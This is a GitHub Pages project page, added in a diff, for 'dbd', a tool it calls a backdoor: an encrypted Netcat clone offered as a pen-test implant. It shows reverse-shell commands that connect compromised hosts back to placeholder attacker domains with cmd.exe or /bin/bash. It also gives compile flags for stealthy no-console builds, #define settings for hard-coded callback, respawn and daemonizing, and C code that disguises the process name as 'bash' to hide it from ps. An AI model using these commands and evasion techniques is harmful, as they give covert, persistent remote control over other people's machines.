@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+    <meta charset='utf-8' />
+    <meta http-equiv="X-UA-Compatible" content="chrome=1" />
+    <meta name="description" content="Dbd : Durandal's Backdoor" />
+
+    <link rel="stylesheet" type="text/css" media="screen" href="stylesheets/stylesheet.css">
+
+    <title>Dbd</title>
+  </head>
+
+  <body>
+
+    <!-- HEADER -->
+    <div id="header_wrap" class="outer">
+        <header class="inner">
+          <a id="forkme_banner" href="https://github.com/gitdurandal/dbd">Fork Me on GitHub</a>
+
+          <h1 id="project_title">Dbd</h1>
+          <h2 id="project_tagline">Durandal's Backdoor</h2>
+
+          <section id="downloads">
+            <a class="zip_download_link" href="https://github.com/gitdurandal/dbd/zipball/master">Download this project as a .zip file</a>
+            <a class="tar_download_link" href="https://github.com/gitdurandal/dbd/tarball/master">Download this project as a tar.gz file</a>
+          </section>
+        </header>
+    </div>
+
+    <!-- MAIN CONTENT -->
+    <div id="main_content_wrap" class="outer">
+      <section id="main_content" class="inner">
+        <pre><code>                      d8888b. d8888b. d8888b.
+                      88  `8D 88  `8D 88  `8D
+                      88   88 88oooY' 88   88
+                      88   88 88~~~b. 88   88
+                      88  .8D 88   8D 88  .8D
+                      Y8888D' Y8888P' Y8888D'
+</code></pre>
+
+<h1><a href="http://gitbrew.org/dbd">Durandal's Backdoor</a></h1>
+
+<p>Copyright (C) 2012 Kyle Barnthouse <a href="mailto:durandal@gitbrew.org"></a><a href="mailto:durandal@gitbrew.org">durandal@gitbrew.org</a><br>
+dbd is distributed under the GNU GPL  </p>
+
+<h3>SYNOPSIS</h3>
+
+<p>dbd is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. dbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution (-e option), choosing source port, continuous reconnection with delay, and some other nice features. dbd supports TCP/IP communication only. Source code and binaries are distributed under the GNU General Public License.</p>
+
+<h3>COMPILATION</h3>
+
+<pre><code>$ make
+usage:
+  make unix     - Linux, NetBSD, FreeBSD, OpenBSD
+  make unix32  - Linux, NetBSD, FreeBSD, OpenBSD 32-bit
+  make sunos    - SunOS (Solaris)
+  make win32    - native win32 console app (w/ Cygwin + MinGW)
+  make win32bg  - create a native win32 no-console app (w/ Cygwin + MinGW)
+  make win32bg CFLAGS=-DSTEALTH - stealthy no-console app
+  make mingw    - native win32 console app (w/ MinGW MSYS)
+  make mingwbg  - native win32 no-console app (w/ MinGW MSYS)
+  make mingwbg CFLAGS=-DSTEALTH - stealthy no-console app (w/ MinGW MSYS)
+  make cygwin   - Cygwin console app
+  make darwin   - Darwin
+
+cross-compile options:
+  make mingw-cross    - win32 cross compile (i586-mingw32msvc-gcc)
+  make mingwbg-cross  - win32 no-console cross compile (i586-mingw32msvc-gcc)
+  make mingwbg-cross CFLAGS=-DSTEALTH - stealthy win32 cross compile
+
+roll up a tarball (move your compiled stuff to binaries/ first:
+  make dist     - create tarball with source files, readme, and binaries/
+</code></pre>
+
+<p>To compile dbd under a Unix-like operating system you need gcc and relevant development tools. For Linux, FreeBSD, NetBSD, OpenBSD (and possibly others), type:</p>
+
+<pre><code>$ make unix
+</code></pre>
+
+<p>For SunOS/Solaris, type:</p>
+
+<pre><code>$ make sunos
+</code></pre>
+
+<p>To compile dbd under Microsoft Windows (NT/2K/XP/2K3) you need MinGW+MSYS, or Cygwin with full development support (Cygwin's MinGW gcc). To compile a native Win32 dbd console application under Cygwin, type:</p>
+
+<pre><code>$ make win32
+</code></pre>
+
+<p>or, under MSYS:</p>
+
+<pre><code>$ make mingw
+</code></pre>
+
+<p>To compile a no-console ("WinMain") application under Cygwin, type:</p>
+
+<pre><code>$ make win32bg
+</code></pre>
+
+<p>or, under MSYS:</p>
+
+<pre><code>$ make mingwbg
+</code></pre>
+
+<p>To compile a Cygwin-specific console application, type:</p>
+
+<pre><code>$make cygwin
+</code></pre>
+
+<p>You may want to change the default behaviour of dbd. One of the most important thing is to change the default shared secret to your own pass phrase. Edit dbd.h and replace with your preferences. You may, for example, want to hardcode a host + port to connect to if dbd is started without options. Complete examples are provided in dbd.h.</p>
+
+<h3>SAMPLE USES</h3>
+
+<p>With a little imagination, dbd can be used for many things...
+* Use dbd to securely transfer files between two networks:</p>
+
+<pre><code>snafu$ dbd -l -p 12345 -k secret &gt; output.file
+
+fubar$ cat input.file | dbd -k secret snafu 12345
+</code></pre>
+
+<p>or from win32:</p>
+
+<pre><code>C:\somedir&gt;type input.fil | dbd -k secret snafu 12345
+</code></pre>
+
+<ul>
+<li>
+<p>Use dbd as a simple (but secure) chat:</p>
+
+<p>snafu$ dbd -P snafu -Hon fubar 1234</p>
+
+<p>fubar$ dbd -Pfubar -Hon -l -p 1234</p>
+</li>
+<li>
+<p>Use dbd as a pen-test backdoor:</p>
+
+<p>C:\hacked box&gt;dbdbg.exe -r1800 -q -e cmd.exe hacker.tld 443
+...</p>
+</li>
+</ul><p>or under Unix-like OSes:</p>
+
+<pre><code>root@owned# ./dbd -r1800 -Don -e /bin/bash hacker.tld 993
+</code></pre>
+
+<h3>HARD CODING OPTIONS</h3>
+
+<p>In addition to using command line options, you can hard code variables by using #defines in dbd.h. To do this, set the variables you wish to use as named constants and compile as normal. For example, if you wanted to hard code a dbd executable that connected back to "evil.nationalbankofuganda.com" on port 995, and executed "/bin/bash" you could run:</p>
+
+<pre><code>root@owned# ./dbd -e /bin/bash evil.nationalbankofuganda.com 995
+</code></pre>
+
+<p>or using hard-coded #defines, you could edit dbd.h:</p>
+
+<pre><code>#define DOLISTEN 0
+#define HOST "evil.nationalbankofuganda.com"
+#define PORT 995
+#define EXECPROG "/bin/bash"
+
+You can also set respawn and stealth options to help maintain your connection:
+
+#define RESPAWN_ENABLED 1
+#define RESPAWN_INTERVAL 900
+#define QUIET 1
+#define DAEMONIZE 1
+</code></pre>
+
+<p>This will set the connection to daemonize ("melt" in malware terms), never send output to STDOUT, and attempt to respawn the connection every 15 minutes should it ever disconnect from the listener.
+    ROMULAN CLOAKING TECHNOLOGY</p>
+
+<p>Now we're getting into the fun stuff. Once you are a mastar at hard-coding options into your backdoor, you can use what is quite possibly the most fun named constant at our disposal: CLOAK. To do this, simply set the value:</p>
+
+<pre><code>#define CLOAK 1
+</code></pre>
+
+<p>NOTE: this currently only works on *nix compiles. Eventually I plan on adding Win32 process migration/hooking so those targets can feel some Romulan love as well.</p>
+
+<p>For *nix environments, this option scrubs argv[0] and replaces it with the string "bash\0". It also scrubs all other argv[]'s (it'd look silly if ps returned "bash -e /bin/bash someremotehost.com 443" now wouldn't it?) I hope it goes without saying that you CANNOT USE THIS OPTION UNLESS YOU ARE HARD CODING YOUR VARIABLES INTO DBD.H. Also, if you're testing this on your own system it's gonna be fun picking the right pid to kill. ;)</p>
+
+<p>Feel free to use this scrubber in anything you happen to be working on:</p>
+
+<pre><code>//grab our named constant
+int cloak = CLOAK;
+
+//Engage cloaking device
+if(cloak)
+{
+    #ifdef WIN32
+    //stub              
+    #else
+    //change argv[0] to say bash       
+    int scrub;
+    strncpy((char *)argv[0], "\0", strlen((char *)argv[0]) + 1);
+    strcpy((char *)argv[0], "bash\0");    
+    for (scrub = 1; scrub &lt; argc; scrub++)
+    {                     
+         strncpy((char *)argv[scrub], "\0", strlen((char *)argv[scrub]) + 1);
+    }                 
+    #endif
+}
+</code></pre>
+
+<h3>WARNING</h3>
+
+<p>Do not pass cached input (a file with commands or similar) to a listening "dbd -e" session. "dbd -e" is using pipes to pass data between the program being executed and dbd. Pipes are used (instead of plain pass-through duplicate file descriptors) because of encryption between the pipes and the socket. In order to prevent the writing end of one of the pipes from blocking the whole process, I turned it into a non-blocking descriptor. There is a chance that when passing too much input at a time through to the -e program, it will be truncated (cut off) since the pipe buffer (in the OS) can't hold all of the data. This problem can be solved by making dbd multi-threaded for instance, but I'll avoid this as long as possible for compatibility reasons.</p>
+
+<h3>CROSS-COMPILING</h3>
+
+<p>Since dbd was designed to interoperate with other tools/frameworks, make now allows win32 cross compiling on Linux systems that have the mingw32-gcc toolchain.  These options are almost identical to their Windows-native counterpart with the addition of "-cross" after the chosen build.  Example:</p>
+
+<pre><code>$ make mingw-cross
+</code></pre>
+
+<p>will do the same thing on a Linux system that</p>
+
+<pre><code>$ make mingw
+</code></pre>
+
+<p>would do on a win32 system with mingw/msys installed on it.</p>
+
+<p>Right now all cross-compile options are built with BackTrack Linux in mind, but should work on any *nix with a little love.  If you have mingw32-gcc installed and make won't build, edit the WCC variable at the top of the Makefile and put the path to your mingw32-gcc binary.  </p>
+
+<p>The eventual goal is to have cross-compile options for arm/android and arm/ios as well.  This is currently doable, but I want to find a way to implement without requiring a 1GB+ android sdk/ndk/wtfk install.  </p>
+
+<h3>LICENSE</h3>
+
+<p>dbd Copyright (C) 2012 Kyle Barnthouse durandal@gitbrew.org</p>
+
+<p>This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 2 of the License, or (at your option) any later version.</p>
+
+<p>This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.</p>
+
+<p>You should have received a copy of the GNU General Public License along with this program; if not, write to the Free Software Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA  </p>
+
+<p>See the COPYING file for more information.  </p>
+
+<hr><p>dbd's AES-CBC-128 + HMAC-SHA1 implementation is Copyright (C) Christophe Devine devine@cr0.net and is distributed under the GNU General Public License (GPL).</p>
+
+<p>Some code (for doexec_win32.h) has been derived from doexec.c from the Win32 port of Netcat (C) Weld Pond and hobbit. Parts of doexec.c is Copyright (C) 1994 Nathaniel W. Mishkin (doexec.c code was originally derived from rlogind.exe).</p>
+
+<p>The original version of Netcat was written by hobbit hobbit@avian.org. The NT version was done by Weld Pond weld@l0pht.com.</p>
+
+<hr><p>Kyle Barnthouse <a href="mailto:durandal@gitbrew.org"></a><a href="mailto:durandal@gitbrew.org">durandal@gitbrew.org</a><br>
+Security Consultant<br><a href="http://gitbrew.org">gitbrew.org</a><br><a href="http://hephaestussec.com">Hephaestus Security</a></p>
+      </section>
+    </div>
+
+    <!-- FOOTER  -->
+    <div id="footer_wrap" class="outer">
+      <footer class="inner">
+        <p class="copyright">Dbd maintained by <a href="https://github.com/gitdurandal">gitdurandal</a></p>
+        <p>Published with <a href="http://pages.github.com">GitHub Pages</a></p>
+      </footer>
+    </div>
+
+    
+
+  </body>
+</html>
